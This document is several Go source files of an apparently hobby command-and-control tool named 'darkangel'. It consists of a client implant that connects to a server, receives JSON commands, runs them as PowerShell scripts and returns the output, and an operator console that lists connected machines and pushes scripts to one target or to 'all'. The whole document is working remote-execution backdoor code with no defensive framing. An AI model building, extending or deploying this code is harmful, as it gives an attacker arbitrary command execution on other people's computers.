package main

import (
	"context"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"sync"
	"syscall"
)

type Command struct {
	Name string
	Args []string
}

func HandleCommand(command Command, conn net.Conn) {
	log.Printf("Received command %s\n", command.Name)

	switch command.Name {
	case "ps":
		go execPs(strings.Join(command.Args[0:], " "), conn)
	}
}

func handleCommandContext(name, args string, conn net.Conn) {
	cmdCtx, cmdCancel := context.WithCancel(context.Background())

	cmd := exec.CommandContext(cmdCtx, name, args)
	cmd.SysProcAttr = &syscall.SysProcAttr{}

	outputPipe, err := cmd.StdoutPipe()
	if err != nil {
		log.Println(err)
	}

	err = cmd.Start()
	if err != nil {
		log.Println(err)
	}

	var wg sync.WaitGroup
	go func() {
		wg.Add(1)
		defer wg.Done()

		output, err := ioutil.ReadAll(outputPipe)
		if err != nil {
			log.Println(err)
		}

		if len(output) > 0 {
			processCommandOutput(string(output), conn)
		}

		waitError := cmd.Wait()
		if waitError != nil {
			log.Println(waitError)
		}
	}()

	interruptChannel := make(chan os.Signal, 1)
	signal.Notify(interruptChannel, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-interruptChannel
		log.Println("Received an interrupt signal. Stopping the command...")
		cmdCancel()
	}()

	wg.Wait()
}

func processCommandOutput(output string, conn net.Conn) {
	log.Printf("PowerShell command output: %s\n", output)

	sendOutputToServer(output, conn)
}

func execPs(script string, conn net.Conn) {
	log.Printf("Executing script %s\n", script)

	go handleCommandContext("powershell", script, conn)
}

package main

import (
	"bytes"
	"encoding/gob"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
)

const host = "localhost"
const port = 2306

func main() {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
	if err != nil {
		log.Fatal("Couldn't connect to server")
	}

	defer conn.Close()
	log.Printf("Connected to server")

	for {
		reply := make([]byte, 2048)

		_, err = conn.Read(reply)
		if err != nil {
			log.Println("Write to server failed:", err.Error())
			os.Exit(1)
		}

		reply = bytes.Trim(reply, "\x00")
		log.Println("Server send data:", string(reply))

		// if server send A, this means we are only checking connection
		if string(reply) == "A" {
			continue
		}

		data := Command{}
		err := json.Unmarshal(reply, &data)
		if err != nil {
			log.Printf("Couldn't unpack data. %s", err)
			continue
		}

		HandleCommand(Command{
			Name: data.Name,
			Args: data.Args,
		}, conn)
	}
}

type Output struct {
	Output     string
	RemoteAddr string
}

func sendOutputToServer(output string, conn net.Conn) {
	var buffer bytes.Buffer

	enc := gob.NewEncoder(&buffer)

	err := enc.Encode(Output{
		Output:     output,
		RemoteAddr: conn.RemoteAddr().String(),
	})
	if err != nil {
		log.Println("Couldn't encode output")
	}
	conn.Write(buffer.Bytes())
}

package client

import (
	"encoding/gob"
	"fmt"
	"net"
)

type Client struct {
	Conn net.Conn
}

type Output struct {
	Output     string
	RemoteAddr string
}

func (client *Client) HandleRequest() {
	dec := gob.NewDecoder(client.Conn)
	for {
		var output Output
		if err := dec.Decode(&output); err != nil {
			client.Conn.Close()
			return
		}
		fmt.Printf("\n\rOutput from %s: %s\n", output.RemoteAddr, output.Output)
	}
}

package core

import (
	"fmt"
)

type CommandResult struct {
	CommandName string
	Result      bool // True completed, False error/uncompleted
	Output      string
}

type Argument struct {
	Name        string
	Description string
}

type CallbackFunc func(request Request) CommandResult
type Command struct {
	Name        string
	Description string
	Callback    CallbackFunc
	Arguments   []Argument
}

var commandsMap = map[string]Command{
	"connections": {
		Name:        "connections",
		Description: "Display connections",
		Callback:    connectionsCmd,
		Arguments:   []Argument{},
	},
	"execps": {
		Name:        "execps",
		Description: "Run Powershell script",
		Callback:    execPsCmd,
		Arguments: []Argument{
			{Name: "target", Description: "target remote address"},
			{Name: "script", Description: "bash script to execute"},
		},
	},
}

var helpCmd = Command{
	Name:        "help",
	Description: "Display available commands",
	Callback: func(request Request) CommandResult {
		helpMessage := generateHelpMessage()
		return CommandResult{Output: helpMessage}
	},
}

func generateHelpMessage() string {
	helpMessage := "Available commands:\n"

	for _, cmd := range commandsMap {
		helpMessage += fmt.Sprintf("%s - %s\n", cmd.Name, cmd.Description)

		if len(cmd.Arguments) > 0 {
			helpMessage += "  Arguments:\n"
			for _, arg := range cmd.Arguments {
				helpMessage += fmt.Sprintf("    %s: %s\n", arg.Name, arg.Description)
			}
		}

		helpMessage += "\n"
	}

	return helpMessage
}

package core

type Config struct {
	Host string
	Port string
}

// New ...
func New(config *Config) *Server {
	return &Server{
		host: config.Host,
		port: config.Port,
	}
}

package core

import (
	"darkangel/server/constant"
	"fmt"
)

func HandleCommandDoesNotExists(commandName string) CommandResult {
	return CommandResult{
		CommandName: commandName,
		Result:      false,
		Output:      fmt.Sprintf(constant.Red+"Command %s doesn't exists."+constant.Reset, commandName),
	}
}

func HandleCommandWrongArgumentsLength(command Command, request Request) CommandResult {
	return CommandResult{
		CommandName: command.Name,
		Result:      false,
		Output:      fmt.Sprintf(constant.Red+"Command %s takes %d argument. Passed %d."+constant.Reset, command.Name, len(command.Arguments), len(request.Args)),
	}
}

func HandleWrongTarget(request Request) CommandResult {
	return CommandResult{
		CommandName: request.CommandName,
		Result:      false,
		Output:      fmt.Sprintf(constant.Red+"Target \"%s\" is either offline or wrong."+constant.Reset, request.Args[0]),
	}
}

package core

import (
	"bytes"
	"darkangel/server/constant"
	"encoding/json"
	"fmt"
	"log"
	"strings"
	"text/tabwriter"
)

func HandleCommand(request Request) CommandResult {
	var cmd Command
	exists := false

	if request.CommandName == "help" {
		cmd, exists = helpCmd, true
	} else {
		cmd, exists = commandsMap[strings.ToLower(request.CommandName)]
	}
	if !exists {
		return HandleCommandDoesNotExists(request.CommandName)
	}

	if len(request.Args) < len(cmd.Arguments) {
		return HandleCommandWrongArgumentsLength(cmd, request)
	}

	return cmd.Callback(request)
}

func connectionsCmd(request Request) CommandResult {
	conns := request.Server.GetConnections()

	var buffer bytes.Buffer
	w := new(tabwriter.Writer)
	w.Init(&buffer, 0, 8, 0, '\t', 0)

	fmt.Fprintf(w, "Local Address\tRemote Address\t(%d connections)\n", len(conns))
	fmt.Fprintln(w, "--------------\t--------------\t")

	for _, client := range conns {
		fmt.Fprintf(w, "%s\t%s\t\n", client.Conn.LocalAddr(), client.Conn.RemoteAddr())
	}

	w.Flush()

	formattedTable := buffer.String()

	return CommandResult{
		CommandName: request.CommandName,
		Result:      true,
		Output:      formattedTable,
	}
}

func packData(data map[string]interface{}) []byte {
	v, err := json.Marshal(data)
	if err != nil {
		log.Fatal("Couldn't Marshall data")
	}
	return v
}

func execPsCmd(request Request) CommandResult {
	targets := request.Server.GetConnection(request.Args[0])
	if targets == nil {
		return HandleWrongTarget(request)
	}

	for _, target := range targets {
		data := packData(map[string]interface{}{"name": "ps", "args": request.Args[1:]})
		_, err := target.Conn.Write([]byte(data))
		if err != nil {
			log.Fatalln(fmt.Sprintf(constant.Red+"Couldn't write to target %s"+constant.Reset, target.Conn.RemoteAddr()))
		}
	}

	return CommandResult{}
}

package core

type Request struct {
	Server      *Server
	CommandName string
	Args        []string
}

package core

import (
	"bufio"
	"darkangel/server/client"
	"darkangel/server/constant"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
)

type Server struct {
	host        string
	port        string
	connections []*client.Client
}

func (server *Server) ListenForInput() {
	newlineCounter := 0
	for {
		fmt.Print(strings.Repeat("\n", newlineCounter) + "> ")
		newlineCounter = 0 // reset counter
		scanner := bufio.NewScanner(os.Stdin)
		scanner.Scan()
		input := scanner.Text()

		splittedInput := strings.Fields(input)

		if len(splittedInput) == 0 {
			continue
		}

		commandName := splittedInput[0]
		args := splittedInput[1:]

		result := HandleCommand(Request{
			Server:      server,
			CommandName: commandName,
			Args:        args,
		})

		fmt.Print(result.Output)
		newlineCounter = 2
	}
}

func (server *Server) Run() {
	listener, err := net.Listen("tcp", fmt.Sprintf("%s:%s", server.host, server.port))
	if err != nil {
		log.Fatal(err)
	}
	log.Printf(constant.Yellow+"Server listening on %s:%s"+constant.Reset, string(server.host), string(server.port))

	go server.ListenForInput()

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatal(err)
		}

		log.Printf(constant.Yellow+"User %s connected"+constant.Reset, conn.RemoteAddr())

		client := &client.Client{
			Conn: conn,
		}
		server.connections = append(server.connections, client)
		go client.HandleRequest()
	}
}

func (server *Server) GetConnections() []*client.Client {
	for n, connectedClient := range server.connections {
		// Send 1 byte to ensure that client is still active
		_, err := connectedClient.Conn.Write([]byte{65})
		if err != nil {
			server.connections = append(server.connections[:n], server.connections[n+1:]...)
		}
	}
	return server.connections
}

func (server *Server) GetConnection(target string) []*client.Client {
	if target == "all" {
		return server.GetConnections()
	}

	for _, connectedClient := range server.connections {
		if connectedClient.Conn.RemoteAddr().String() == target {
			_, err := connectedClient.Conn.Write([]byte{65})
			if err != nil {
				return nil
			}

			return []*client.Client{connectedClient}
		}
	}

	return nil
}

